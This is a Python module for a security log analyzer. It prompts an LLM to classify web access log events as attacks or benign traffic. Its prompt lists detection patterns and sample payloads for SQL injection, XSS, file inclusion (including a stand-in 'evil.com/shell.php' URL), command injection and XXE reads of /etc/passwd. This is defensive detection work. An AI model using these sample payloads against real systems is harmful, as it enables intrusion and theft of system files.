"""
LLM-based attack analysis module for V1 Log Analyzer System.

This module provides the LLMAnalyzer class that uses ChatGroq LLM to classify
security events as attacks or benign traffic. Events are processed in chunks
to manage LLM context limits and API efficiency.
"""

import json
import logging
import os
import re
from typing import Any

from langchain_groq import ChatGroq
from langchain_core.messages import HumanMessage

from backend.models import Event, EventLabel


# Configure logging
logger = logging.getLogger(__name__)


class LLMAnalyzer:
    """
    LLM-based security event analyzer.
    
    Uses ChatGroq LLM to classify events as attack types or benign traffic.
    Processes events in chunks to manage context window and API efficiency.
    
    Requirements: 3.1, 3.2, 3.3, 3.4
    """
    
    def __init__(self, llm: ChatGroq):
        """
        Initialize LLMAnalyzer with ChatGroq LLM instance.
        
        Args:
            llm: ChatGroq LLM instance configured with model and API key
        
        Requirements: 3.2
        """
        self.llm = llm
        # Read chunk size from environment variable
        self.chunk_size = int(os.getenv('LLM_CHUNK_SIZE', '100'))
        logger.info(f"LLMAnalyzer initialized with chunk size: {self.chunk_size}")
    
    async def analyze_events(self, events: list[Event], user_query: str = "") -> dict[str, EventLabel]:
        """
        Analyze events in chunks and classify as attack types or benign (V2 extended).
        
        Processes events in chunks of CHUNK_SIZE to manage LLM context limits.
        Each chunk is analyzed independently and results are aggregated.
        
        Args:
            events: List of normalized Event objects to analyze
            user_query: User's question/focus area for analysis
        
        Returns:
            Dictionary mapping event_id to EventLabel with full classification details.
            Attack types: sqli, xss, lfi, rfi, rce, xxe, path_traversal,
                         command_injection, or benign
        
        Requirements: 3.1, 3.2, 3.3, 3.4, V2-R1
        """
        all_labels = {}
        chunks = self._chunk_events(events, self.chunk_size)
        
        logger.info(f"Analyzing {len(events)} events in {len(chunks)} chunks")
        if user_query:
            logger.info(f"User focus: {user_query}")
        
        for i, chunk in enumerate(chunks, 1):
            logger.info(f"Processing chunk {i}/{len(chunks)} ({len(chunk)} events)")
            
            try:
                # Create prompt for this chunk
                prompt = self._create_prompt(chunk, user_query)
                
                # Call LLM
                response = await self.llm.ainvoke([HumanMessage(content=prompt)])
                
                # Parse response
                labels = self._parse_response(response.content)
                
                # Validate: ensure all events in chunk are classified
                missing_events = []
                for event in chunk:
                    if event['event_id'] not in labels:
                        missing_events.append(event['event_id'])
                        # Mark missing events as benign with low confidence
                        labels[event['event_id']] = EventLabel(
                            is_attack=False,
                            attack_type='benign',
                            short_note='Not classified by LLM (marked as benign)',
                            mitre_technique=None,
                            confidence=0.3
                        )
                
                if missing_events:
                    logger.warning(f"Chunk {i}: LLM did not classify {len(missing_events)} events, marked as benign: {missing_events[:5]}")
                
                # Update all_labels
                all_labels.update(labels)
                
                logger.info(f"Chunk {i} analyzed: {len(labels)} events classified")
            
            except Exception as e:
                # Mark failed chunks as benign
                logger.error(f"Failed to analyze chunk {i}: {e}")
                for event in chunk:
                    all_labels[event['event_id']] = EventLabel(
                        is_attack=False,
                        attack_type='benign',
                        short_note='Analysis failed',
                        mitre_technique=None,
                        confidence=0.0
                    )
                logger.warning(f"Marked {len(chunk)} events in chunk {i} as benign due to error")
        
        logger.info(f"Analysis complete: {len(all_labels)} events classified")
        return all_labels
    
    def _chunk_events(self, events: list[Event], chunk_size: int) -> list[list[Event]]:
        """
        Split events into chunks of specified size.
        
        Args:
            events: List of Event objects
            chunk_size: Maximum number of events per chunk
        
        Returns:
            List of event chunks
        """
        chunks = []
        for i in range(0, len(events), chunk_size):
            chunks.append(events[i:i + chunk_size])
        return chunks
    
    def _create_prompt(self, events: list[Event], user_query: str = "") -> str:
        """
        Create analysis prompt for LLM.
        
        Formats events into a prompt that instructs the LLM to classify
        each event as an attack type or benign traffic.
        
        Args:
            events: List of Event objects to analyze
            user_query: User's question/focus area for analysis
        
        Returns:
            Formatted prompt string
        
        Requirements: 3.1
        """
        prompt = """You are an expert security analyst. Analyze web access logs and identify attacks with HIGH PRECISION.
"""
        
        # Add user query context if provided
        if user_query:
            prompt += f"""
USER'S QUESTION/FOCUS:
"{user_query}"

Pay special attention to the user's question when analyzing events. If they ask about specific attack types (e.g., "SQL injection", "file uploads"), prioritize detecting those patterns.
"""
        
        prompt += """


ATTACK TYPES AND DETECTION RULES:

1. sqli (SQL Injection) - MUST contain SQL syntax:
   - Keywords: UNION, SELECT, INSERT, UPDATE, DELETE, DROP, OR 1=1, ' OR '1'='1
   - Encoded: %20UNION%20, %27%20OR%20, /*!50000UNION*/
   - Examples: "id=1 UNION SELECT", "user=admin' OR 1=1--"

2. xss (Cross-Site Scripting) - MUST contain script/HTML injection:
   - Tags: <script>, <iframe>, <img>, <svg>, <object>
   - Events: onerror=, onload=, onclick=
   - Encoded: %3Cscript%3E, %3C%2Fscript%3E, &#x3C;script&#x3E;
   - Examples: "<script>alert(1)</script>", "onerror=alert(document.cookie)"

3. lfi (Local File Inclusion) - MUST reference local system files:
   - Patterns: ../../../etc/passwd, ..\\..\\windows\\system32
   - Files: /etc/passwd, /etc/shadow, /proc/self/environ, win.ini
   - Encoded: %2e%2e%2f, ..%252f, %5c%5c
   - Examples: "file=../../../../etc/passwd", "path=..\\..\\boot.ini"

4. rfi (Remote File Inclusion) - MUST include external URL:
   - Patterns: http://, https://, ftp://, //evil.com
   - Examples: "file=http://evil.com/shell.php", "include=//attacker.com/backdoor"

5. rce (Remote Code Execution) - MUST contain code execution attempts:
   - Commands: system(), exec(), eval(), Runtime.getRuntime()
   - Shell: cmd.exe, /bin/sh, bash, powershell
   - Encoded: %65%76%61%6C (eval), ${...}
   - Examples: "cmd=ls", "exec('whoami')", "Runtime.getRuntime().exec('calc')"

6. path_traversal - MUST contain directory traversal:
   - Patterns: ../, ..\\, %2e%2e%2f, %252e%252e%252f
   - Examples: "../../config.php", "..\\\\..\\\\database.mdb"

7. command_injection - MUST contain shell command injection:
   - Operators: |, ||, &, &&, ;, `, $()
   - Commands: cat, ls, whoami, id, ping, wget, curl
   - Examples: "; cat /etc/passwd", "| whoami", "`id`"

8. xxe (XML External Entity) - MUST contain XXE payload:
   - Patterns: <!DOCTYPE, <!ENTITY, SYSTEM, file://
   - Examples: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"

9. benign - Normal legitimate traffic:
   - Regular pages: /index.html, /about.php, /api/users
   - Static files: .css, .js, .png, .jpg, .gif
   - Normal parameters: ?page=1, ?search=product

CRITICAL RULES FOR FILE UPLOADS:
- POST requests with [Body: ...] or [File: ...] are SUSPICIOUS
- File extensions: .php, .jsp, .asp, .aspx, .exe, .sh, .py = HIGH RISK = rce
- Shell files: shell.php, backdoor.jsp, webshell.asp = rce
- Normal uploads: .jpg, .png, .pdf, .txt = benign (unless suspicious filename)
- Check BOTH filename AND file content in Body

ANALYSIS RULES:
1. Examine URI, query parameters, POST body, and filenames carefully
2. Look for encoded/obfuscated attacks (URL encoding, hex, unicode)
3. Multiple attack indicators = DEFINITELY an attack
4. Status codes: 500, 403, 400 often indicate attack attempts
5. User agents: sqlmap, nikto, burp, hydra = likely attacks
6. When uncertain, prefer benign over false positives
7. POST file uploads with suspicious extensions (.php, .jsp, .exe) = rce

OUTPUT FORMAT (V2 Extended):
CRITICAL REQUIREMENTS:
1. Return ONLY pure JSON, no markdown, no code blocks, no explanations
2. Start directly with { and end with }
3. YOU MUST CLASSIFY ALL EVENTS - Do not skip any event_id
4. If unsure, mark as benign with low confidence
5. Every event_id in the input MUST appear in the output

{
  "results": [
    {
      "event_id": "evt_001",
      "is_attack": true,
      "attack_type": "sqli",
      "short_note": "SQL injection via UNION SELECT in id parameter",
      "mitre_technique": "T1190",
      "confidence": 0.95
    },
    {
      "event_id": "evt_002",
      "is_attack": false,
      "attack_type": "benign",
      "short_note": "Normal page request",
      "mitre_technique": null,
      "confidence": 0.99
    }
  ]
}

DO NOT wrap in markdown code blocks. Return pure JSON only.
REMEMBER: Classify ALL events, including benign ones!

MITRE ATT&CK Techniques (chọn technique phù hợp nhất):
- T1190: Exploit Public-Facing Application (SQLi, XSS, RCE, XXE - tấn công ứng dụng web)
- T1059: Command and Scripting Interpreter (command injection, RCE, shell execution)
- T1059.001: PowerShell (PowerShell command injection)
- T1059.003: Windows Command Shell (cmd.exe exploitation)
- T1059.004: Unix Shell (bash/sh command injection)
- T1083: File and Directory Discovery (LFI, path traversal, directory listing)
- T1071: Application Layer Protocol (HTTP/HTTPS exploitation)
- T1071.001: Web Protocols (HTTP-based attacks)
- T1505: Server Software Component (webshell, backdoor)
- T1505.003: Web Shell (webshell upload/execution)
- T1203: Exploitation for Client Execution (XSS, client-side attacks)
- T1210: Exploitation of Remote Services (remote exploitation)
- T1133: External Remote Services (exposed services exploitation)
- T1078: Valid Accounts (credential stuffing, brute force)
- T1110: Brute Force (password attacks)
- T1110.001: Password Guessing
- T1110.003: Password Spraying
- T1557: Man-in-the-Middle (session hijacking, MITM)
- T1212: Exploitation for Credential Access (credential theft)
- T1027: Obfuscated Files or Information (encoded payloads)
- T1140: Deobfuscate/Decode Files or Information (payload decoding)
- T1566: Phishing (if applicable)
- T1189: Drive-by Compromise (malicious redirects)
- T1068: Exploitation for Privilege Escalation (privilege escalation attempts)

Events to analyze:
"""
        
        for event in events:
            # Format event for analysis with more context
            event_str = f"\n{event['event_id']}: "
            event_str += f"{event['method']} {event['uri']} "
            event_str += f"(IP: {event['src_ip']}, Status: {event['status']}, UA: {event['user_agent'][:50] if event['user_agent'] else 'N/A'})"
            prompt += event_str
        
        return prompt
    
    def _parse_response(self, response_content: str) -> dict[str, EventLabel]:
        """
        Parse LLM response and extract event classifications (V2 extended).
        
        Handles various response formats including markdown code blocks.
        Extracts JSON and converts to event_id -> EventLabel mapping.
        
        Args:
            response_content: Raw LLM response text
        
        Returns:
            Dictionary mapping event_id to EventLabel
        
        Raises:
            ValueError: If response cannot be parsed as valid JSON
        
        Requirements: 3.3, V2-R1
        """
        # Remove markdown code blocks if present
        content = response_content.strip()
        
        # Handle markdown code blocks with various formats
        # Case 1: ### Analysis Results\n```json\n{...}\n```
        if '```json' in content:
            # Extract content between ```json and ```
            start = content.find('```json') + 7
            end = content.find('```', start)
            if end != -1:
                content = content[start:end]
        # Case 2: ```\n{...}\n```
        elif content.startswith('```'):
            content = content[3:]
            if content.endswith('```'):
                content = content[:-3]
        # Case 3: Just remove trailing ```
        elif content.endswith('```'):
            content = content[:-3]
        
        content = content.strip()
        
        # Parse JSON
        try:
            data = json.loads(content)
        except json.JSONDecodeError as e:
            logger.error(f"Failed to parse JSON response: {e}")
            logger.error(f"Response content: {content[:200]}...")
            raise ValueError(f"Invalid JSON response from LLM: {e}")
        
        # Extract results
        if 'results' not in data:
            raise ValueError("Response missing 'results' field")
        
        # Convert to dict with EventLabel
        labels = {}
        for result in data['results']:
            if 'event_id' not in result:
                logger.warning(f"Skipping invalid result (missing event_id): {result}")
                continue
            
            # V2: Create EventLabel with full details
            labels[result['event_id']] = EventLabel(
                is_attack=result.get('is_attack', result.get('attack_type', 'benign') != 'benign'),
                attack_type=result.get('attack_type', 'benign'),
                short_note=result.get('short_note', ''),
                mitre_technique=result.get('mitre_technique'),
                confidence=result.get('confidence', 0.5)
            )
        
        return labels
